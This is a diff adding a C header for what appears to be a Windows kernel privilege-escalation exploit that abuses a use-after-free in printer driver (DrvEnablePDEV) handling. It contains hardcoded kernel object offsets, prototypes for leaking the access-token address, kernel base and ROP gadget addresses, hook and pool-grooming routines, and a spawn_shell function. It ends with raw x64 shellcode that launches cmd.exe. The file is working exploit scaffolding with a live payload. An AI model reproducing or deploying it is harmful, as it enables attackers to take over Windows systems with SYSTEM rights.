@@ -1,0 +1,65 @@
+#pragma once
+#define PAGE_SIZE 4096
+#define POOL_MAX_ALLOC PAGE_SIZE
+
+#define SystemBigPoolInformation 0x42
+#define ThreadNameInformation 0x26
+#define SystemModuleInformation  0xb
+#define SystemHandleInformation 0x10
+#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
+#define ACCESS_TOKEN_HANDLE 0x5
+
+#define _chunk_size 0xe20
+#define po_dhpdev_offset 0xa68
+#define po_ppfn_INDEX_DrvResetPDEV_offset 0x6b8
+
+typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO {
+	USHORT UniqueProcessId;
+	USHORT CreatorBackTraceIndex;
+	UCHAR ObjectTypeIndex;
+	UCHAR HandleAttributes;
+	USHORT HandleValue;
+	PVOID Object;
+	ULONG GrantedAccess;
+} SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;
+typedef struct _SYSTEM_HANDLE_INFORMATION {
+	ULONG NumberOfHandles;
+	SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
+} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;
+typedef struct _BIG_POOL_INFO
+{
+	union {
+		PVOID VirtualAddress;
+		ULONG_PTR NonPaged : 1;
+	};
+	ULONG_PTR SizeInBytes;
+	union {
+		UCHAR Tag[4];
+		ULONG TagUlong;
+	};
+} BIG_POOL_INFO, * PBIG_POOL_INFO;
+
+typedef NTSTATUS(*fnNtSetInformationThreadPtr) (HANDLE threadHandle, THREADINFOCLASS threadInformationClass, PVOID threadInformation, ULONG threadInformationLength);
+typedef BOOL(*_DrvEnableDriver) (ULONG iEngineVersion, ULONG cj, DRVENABLEDATA* pded);
+typedef DHPDEV(*_DrvEnablePDEV) (DEVMODEW* pdm, LPWSTR pwszLogAddress, ULONG cPat, HSURF* phsurfPatterns, ULONG cjCaps, ULONG* pdevcaps, ULONG cjDevInfo, DEVINFO* pdi, HDEV hdev, LPWSTR pwszDeviceName, HANDLE hDriver);
+typedef VOID(*void_function)();
+
+DWORD64 leak_access_token_address();
+DWORD64 leak_module_base_kernel();
+DWORD64 leak_gadget_address();
+DWORD64 handle_to_address(HANDLE, DWORD);
+DWORD64 setup_gadget(DWORD64);
+DWORD  thread_main(LPVOID);
+BOOL setup_hook();
+DHPDEV hook(DEVMODEW*, LPWSTR, ULONG, HSURF*, ULONG, ULONG*, ULONG, DEVINFO*, HDEV, LPWSTR, HANDLE);
+VOID claim_chunk();
+VOID createpalette_primitive(SHORT);
+VOID spawn_shell();
+
+_DrvEnablePDEV hooked_function;
+LPWSTR hooked_printer_name;
+DWORD64 crafted_BitMapHeader_address, rtlSetAllBits_address;
+BOOL uaf;
+HDC uaf_hdc;
+
+unsigned char shellcode[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x6d\x64\x2e\x65\x78\x65\x00";
